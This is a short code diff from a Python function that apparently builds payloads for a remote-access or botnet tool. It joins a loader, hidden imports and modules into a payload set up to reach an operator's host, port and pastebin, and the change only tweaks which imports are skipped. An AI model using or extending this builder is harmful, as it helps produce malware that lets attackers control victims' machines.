@@ -284,7 +284,7 @@ def _payload(options, **kwargs):
 
 #    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
     loader  = open('core/loader.py','r').read()
-    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if not i == '_winreg'])
+    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg']])
     modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
     payload = '\n'.join((loader, test_imports, modules))
 
